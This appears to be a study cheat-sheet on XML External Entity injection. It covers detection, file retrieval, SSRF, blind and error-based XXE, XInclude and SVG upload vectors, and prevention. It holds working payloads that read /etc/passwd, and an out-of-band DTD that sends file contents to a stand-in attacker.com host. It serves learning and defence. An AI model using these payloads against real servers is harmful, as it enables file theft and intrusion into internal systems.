# XML External Entity Injection

XXE Injection is a web security vulnerability that occurs when an application parses XML input and allows external entities to be processed. XXE allows attackers to interfere with XML processing and interact with internal or external resources accessible by the server.

XXE can allow:

* File retrieval
* SSRF
* Internal network interaction
* Out-of-band data exfiltration

---

## Detection

XXE detection involves identifying XML processing functionality and testing whether external entities are resolved.

Signs an application processes XML:

* `Content-Type: application/xml`
* `Content-Type: text/xml`
* SOAP requests
* XML request bodies
* XML parsing errors
* XML file uploads:

  * SVG
  * DOCX
  * XLSX

Applications sometimes accept XML even when another format is expected.

### Internal Entity

Internal entities are declared within the DTD.

Syntax:

```xml
<!ENTITY entity_name "entity_value">
```

Example:

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY example "Doe">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

### External Entity

External entities are declared outside the XML document using `SYSTEM`.

Syntax:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

### Types of Entities

| Type             | Prefix   | Usage               |
| ---------------- | -------- | ------------------- |
| General Entity   | `&name;` | Inside XML document |
| Parameter Entity | `%name;` | Inside DTD          |

General entities are commonly used in reflected XXE.
Parameter entities are heavily used in blind XXE exploitation.

---

## XXE to Retrieve Files

Occurs when external entities are resolved and reflected in the response.

Original Request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>381</productId>
</stockCheck>
```

XXE Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

If vulnerable, the response may contain file contents.

Common file targets:

Linux:

```text
/etc/passwd
/etc/hostname
/etc/issue
```

Windows:

```text
C:\windows\win.ini
```

---

## XXE to Perform SSRF Attacks

XXE can be used for SSRF against internal systems.

Targets:

* Internal applications
* Internal APIs
* Cloud metadata endpoints
* Internal ports/services

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Cloud metadata endpoints are high-value SSRF targets.

---

## Blind XXE Vulnerabilities

Blind XXE occurs when the application does not reflect entity output in responses.

In blind XXE:

* No visible response changes occur
* File contents are not directly returned
* Out-of-band interaction is required

Burp Collaborator is commonly used for detection.

### Blind XXE Detection

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-ID">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

If the server performs a DNS or HTTP request to the collaborator domain, XXE exists.

DNS interactions alone can confirm XXE.

---

## Blind XXE Using External DTD

External DTDs are commonly used in blind XXE exploitation to exfiltrate data out-of-band.

XML Payload:

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
%xxe;
]>
```

Malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

Parameter entities are heavily used in DTD exploitation.

---

## Error-Based XXE

Some XML parsers leak file contents through parser errors.

Payload:

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
%eval;
%error;
]>
```

Useful when direct reflection is unavailable.

---

## XInclude Attacks

XInclude attacks work when user input is embedded into a server-side XML document and full DTD control is not possible.

Payload:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Useful when only partial XML injection is possible.

---

## XXE via File Upload

Some uploaded file formats contain XML or XML subcomponents.

Common targets:

* SVG
* DOCX
* XLSX

SVG XXE Example:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

SVG uploads are common XXE vectors.

---

## XXE via Modified Content-Type

Some applications accept XML even when another format is expected.

Original Request:

```http
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

foo=bar
```

Modified Request:

```http
POST /action HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<foo>bar</foo>
```

Changing content-type may expose hidden XML parsing functionality.

---

## Local DTD Repurposing

Some operating systems contain local DTD files that can be abused during blind XXE exploitation.

Useful when:

* External DTDs are blocked
* Outbound traffic is restricted

Common in advanced blind XXE exploitation.

---

## Prevention

* Disable DTD processing
* Disable external entities
* Use secure XML parsers
* Validate XML input
* Prefer JSON over XML when possible
